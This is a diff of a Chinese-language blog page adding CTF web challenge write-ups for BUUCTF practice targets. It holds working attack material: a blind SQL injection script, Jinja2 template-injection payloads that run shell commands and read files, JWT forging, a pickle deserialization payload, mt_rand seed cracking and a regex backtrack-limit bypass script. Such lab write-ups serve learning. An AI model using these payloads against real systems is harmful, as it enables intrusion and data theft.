@@ -712,7 +712,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2024-03-28 01:22:53" itemprop="dateModified" datetime="2024-03-28T01:22:53+08:00">2024-03-28</time>
+      <time title="Modified: 2024-03-28 01:38:19" itemprop="dateModified" datetime="2024-03-28T01:38:19+08:00">2024-03-28</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -745,14 +745,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Word count in article: </span>
-      <span>8.1k</span>
+      <span>15k</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>15 mins.</span>
+      <span>27 mins.</span>
     </span>
 </div>
 
@@ -867,6 +867,125 @@
 <p><strong>-&gt;并且上传的文件能够被Web容器解释执行（php被Aapche容器执行）,所以文件上传后所在的目录必须是Web容器能够覆盖到的</strong></p>
 <hr>
 <p>参考：<a target="_blank" rel="noopener" href="https://mayi077.gitee.io/2020/02/01/0CTF-2016-piapiapia/">https://mayi077.gitee.io/2020/02/01/0CTF-2016-piapiapia/</a></p>
+<h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>这个题是让输入number，最多可以输到4有输出，5就没输出了</p>
+<blockquote>
+<ol>
+<li>有目的去测试过滤了什么 （过滤空格）</li>
+</ol>
+</blockquote>
+<p><img src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/%E9%A2%9C%E5%80%BC%E6%9F%A5%E8%AF%A2-00.png"></p>
+<p>如果有回显，会是 <code>Hi admin, your score is: 100</code></p>
+<p>-&gt; 这句话可以作为我们判断有回显的标志</p>
+<p>当输出1时，会有这句话，可以通过布尔盲注</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#二分法 布尔盲注</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://a44d77a2-0e84-4a62-9a6d-92e663b37e72.node5.buuoj.cn:81/?stunum=&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;1^(ascii(substr((select(database())),&#123;i&#125;,1))&gt;&#123;mid&#125;)^1&#x27; #查库名 ctf</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&quot; #查表名flag,score</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&quot;  #查段名flag,value</span></span><br><span class="line">        payload = <span class="string">f&quot;if(ascii(substr((select(value)from(flag)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)&quot;</span> <span class="comment"># 查字段</span></span><br><span class="line">        r = requests.get(url=url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hi admin, your score is: 100&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>看到题目Flask，有印象但不多。</p>
+<p>看到笔记和Wp才想起来跟SSTI有关 -&gt; 测试得到的确存在SSTI注入**[jinja2]**</p>
+<p><img src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/04.png"></p>
+<p><img src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/05.png"></p>
+<p>学到一个测试python版本和读取环境变量的payload</p>
+<p><code>search=&#123;&#123;"".__class__.__mro__[-1].__subclasses__()[40]&#125;&#125;</code></p>
+<p>-&gt;    &lt;type ‘file’&gt;  &#x3D;&gt; 这是python2中有的</p>
+<p><code>search=&#123;&#123;config&#125;&#125;</code></p>
+<p><strong>过滤了globals   通过字符串拼接绕过</strong></p>
+<p>-&gt; 大量回显，看到提示 &#x3D;&gt; flag在当前目录下</p>
+<p><code>search=&#123;&#123;''.__class__.__bases__[0].__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__(%27os%27).popen(%27dir%27).read()")&#125;&#125;</code></p>
+<p>-&gt; 查目录</p>
+<p><code>search=&#123;&#123;''.__class__.__bases__[0].__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__(%27os%27).popen(%27ls /flasklight%27).read()")&#125;&#125;</code></p>
+<p>-&gt; 查看 &#x2F;flasklight路径的目录</p>
+<p><code>search=&#123;&#123;''.__class__.__bases__[0].__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__(%27os%27).popen(%27cat /flasklight/coomme_geeeett_youur_flek%27).read()")&#125;&#125;</code></p>
+<p>-&gt; 读取flag</p>
+<h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p><strong>–抓包改数据 jwt伪造  代码审计 python反序列化</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cjsblog/p/9277677.html">认识jwt</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://1907a1d1-cff6-463b-b02e-360fc3e462ba.node5.buuoj.cn:81/shop?page=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">2000</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    r = requests.get(url + <span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>先通过脚本找到 lv6 所在的页数   181</p>
+</blockquote>
+<p><img src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/06.png"></p>
+<p>肯定，钱不够，尝试抓包能否修改</p>
+<p><img src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/07.png"></p>
+<p>放包之后发现 跳转到 &#x2F;b1g_m4mber页面，只允许admin访问</p>
+<p><img src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/08.png"></p>
+<p>这里就涉及了到了伪造admin了（我知道的有 session伪造），这个题是jwt伪造：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_61025358/article/details/134744252">需要工具<code>c-jwt-cracker</code></a></p>
+<p>-&gt; 我看网上wp大部分都是用docker的，不过我这docker不会用，就用另外的一个</p>
+<p><a target="_blank" rel="noopener" href="https://jwt.io/">jwt编码网站</a></p>
+<p>抓包获取jwt数据，用工具获得秘钥，在编码网站上修改 username: <code>admin</code>     下面的秘钥为工具找出来 <code>1Kun</code></p>
+<p><img src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/09.png"></p>
+<p>然后左边是实时变化的，更改完成之后，复制左边的，替换抓包中的jwt数据</p>
+<p>然后，点购买，进去页面结算抓包，修改折扣和jwt</p>
+<p><img src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/11.png"></p>
+<p>然后，并不是结束，源码中有个后门，放了网站的源码  访问下载 审计（python反序列化）</p>
+<p><img src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/12.png"></p>
+<p><strong>源码审计</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle <span class="comment"># pickle模块提供了一个简单的持久化功能，可以将对象以文件的形式存放在磁盘上</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdminHandler</span>(<span class="title class_ inherited__">BaseHandler</span>):</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>urllib.unquote() 将存入的字典参数 解码 为URL查询字符串</p>
+<p>转换成以key1 &#x3D; value1 &amp; key2 &#x3D; value2的形式</p>
+</blockquote>
+<blockquote>
+<p>pickle.loads(urllib.unquote(become)) 从字节对象中读取被封装的对象</p>
+<p>类里面的<code>__reduce__python</code>魔术方法会在该类被反序列化的时候会被调用Pickle模块中最常用函数</p>
+</blockquote>
+<p><code>pickle.dump(obj,file)</code> 序列化函数, 将obj对象序列化到file中</p>
+<p><code>pickle.dumps(string)</code>  这是对字符串的序列化</p>
+<p><code>pickle.load(file) </code>将file中的对象序列化读出，file是文件名称</p>
+<p><code>pickle.loads(string)</code> 这是对字符串的反序列化</p>
+<p>检测python反序列化的方法： </p>
+<ol>
+<li>检查模块 <code>cPickle  pickle</code>，</li>
+<li>如果存在这模块，进一步检查 cPickle.loads() pickle.loads()反序列化入口</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>python2 和 python3 出的结果还不一样。</p>
+<p><img src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/14.png"></p>
+<blockquote>
+<p> 不进行url编码之前的输出是不一样的，那进行编码之后肯定不一样了。</p>
+</blockquote>
+<p><img src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/16.png"></p>
+<blockquote>
+<p>这个题要用python2</p>
+</blockquote>
+<p>点一键成为大会员抓包，在become的参数地方传参，发包就能看到flag了</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/satasun/article/details/109708593">参考Wp 和python反序列化</a></p>
+<h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><h4 id="—-伪随机数"><a href="#—-伪随机数" class="headerlink" title="—&gt; 伪随机数"></a>—&gt; 伪随机数</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/192012.html">大佬文章学习mt_rand()伪随机数</a></p>
+<p><code>mt_srand()</code>是设置一个随机数的初始值（种子）</p>
+<p><code>mt_rand()</code>是生成随机数</p>
+<p><strong>mt_rand()函数</strong></p>
+<p>-&gt; 该函数用 Mersenne Twister算法的特性作为随机数发生器，它的平均速度比 libc 提供的 rand() 快四倍</p>
+<p>-&gt; 有两个参数 min max 在这两个值中间产生</p>
+<p>-&gt; 如果没有可选参数，默认是 0 到 mt_getrandmax() 之间</p>
+<p><strong>伪随机数是由确定的算法计算出来的随机数序列 &#x3D;&gt; 若种子不变，伪随机数数序也不会变</strong></p>
+<p>&#x3D;&gt; 如果知道种子，或者部分的数序（通过工具算出来种子）</p>
+<p>&#x3D;&gt; 那么就可以得到后面的数序</p>
+<p><strong>第一次调用mt_rand()函数会检查有没有种子，如果没有种子，通过 mt_srand()产生种子，之后调用，直接用这个种子来生成随机数</strong></p>
+<p><strong>php_mt_seed工具</strong>     这是破解mt_rand()函数的seed的工具。</p>
+<p><strong>mt_rand的算法从PHP 3.0.6开始就一直在变化，php_mt_seed 4.0 支持以下几个大的版本： PHP 3.0.7 to 5.2.0，PHP 5.2.1 to 7.0.x， and PHP 7.1.0+</strong></p>
+<p>基于命令行运行：</p>
+<p><strong>一个参数：</strong>mt_rand()函数生成的第一个随机数</p>
+<p><strong>两个参数：</strong>代表mt_rand()函数第一次输出是在什么区间内，第一个参数是min  第二个参数是max</p>
+<p><strong>四个参数（高级模式）：</strong>前两个参数代表mt_rand()函数第一个数的区间，后两个代表mt_rand()函数输出的区间</p>
+<p><strong>多于五个参数：</strong>每四个参数为一组，每一组引用对应的随机数输出 . 最后一组可以是1,2或4个参数</p>
+<h4 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h4><p>环境页面，给我们了10位字符串，让我们猜后面的10位，如果猜对就有flag，随便看了看源码</p>
+<p>发现有<code>check.php</code>页面 &#x3D;&gt; 访问</p>
+<p><img src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/18.png"></p>
+<p><img src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/19.png"></p>
+<p>这是一个伪随机数生成的过程，而我们已经知道了前10位，利用工具来得到种子，从而算出全部字符</p>
+<p><code>在用工具之前，要将已知的十个字符转换成 符合工具的数字形式</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">str1 = <span class="string">&quot;Q0vJS9XCju&quot;</span></span><br><span class="line">str2 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">result =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">length = <span class="built_in">str</span>(<span class="built_in">len</span>(str2)-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str1)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str2)):</span><br><span class="line">        <span class="keyword">if</span> str1[i] ==  str2[j]:</span><br><span class="line">            result += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> +<span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + length + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/17.png"></p>
+<p>找到种子之后，通过代码生成随机数序，这个过程可以参考check.php的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">348806110</span>); <span class="comment"># 通过工具获得的种子</span></span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>然后将生成的结果提交即可</p>
+<p><strong>注意：要注意php版本的问题，如果php版本满足要求，生成的随机数序是不对的。</strong></p>
+<p><strong>PHP版本要大于7.1</strong></p>
 <h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>这个题看Wp说有源码泄露</p>
 <ul>
 <li><input disabled type="checkbox"> 代码审计</li>
@@ -878,8 +997,27 @@
 <p>环境变量的概念：</p>
 <p>操作系统用来存储关于系统运行时信息的数据，这些信息可以被操作系统和执行的程序访问。PATH环境变量特别用于查找执行文件（例如程序或脚本）的位置。<strong>当你在Shell中输入一个命令时，操作系统会依次检查PATH变量中列出的目录，直到找到对应的执行文件。</strong></p>
 </blockquote>
-<p>法1： 用换行符（%0A）绕过正则匹配：</p>
-<p>&#96;</p>
+<p>法1： 用换行符（%0A）绕过正则匹配:</p>
+<p><img src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/00.png"></p>
+<p><strong>环境变量被设置到 &#x2F;home&#x2F;rceservice&#x2F;jail的位置了，所以我们要通过绝对路径来运行 cat命令</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%0A&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;%0A&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/01-1711388632880.png"></p>
+<p>法2：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">preg_match()函数的最大回溯次数限制</a></p>
+<p>正则表达式是一个可以被“有限状态自动机”接受的语言类。</p>
+<p>常见的正则引擎又被细分为，DFA(确定性有限状态自动机) 与 NFA(非确定性有限状态自动机)</p>
+<p>DFA：从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</p>
+<p>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</p>
+<p><strong>PHP的pcre.backtrack_limit限制利用</strong></p>
+<p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。我们可以通过<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>的方式查看当前环境下的上限：</p>
+<p><code>php -a</code>进入shell模式</p>
+<p><img src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/02-1711388632881.png"></p>
+<p>中英不一样（以英文版为主，上限默认是100万次）</p>
+<p>如果回溯次数超过上限 &#x3D;&gt; 返回false</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://21f64b23-2c68-4e4c-9a97-3a552fe3e8d7.node5.buuoj.cn:81/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;cmd&#x27;</span>:<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;haha&quot;:&quot;&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">1000000</span>+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
 
       
     </div>
@@ -2050,13 +2188,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="Word count total">41k</span>
+    <span title="Word count total">48k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">1:15</span>
+    <span title="Reading time total">1:27</span>
   </span>
 </div>
 <div class="busuanzi-count">
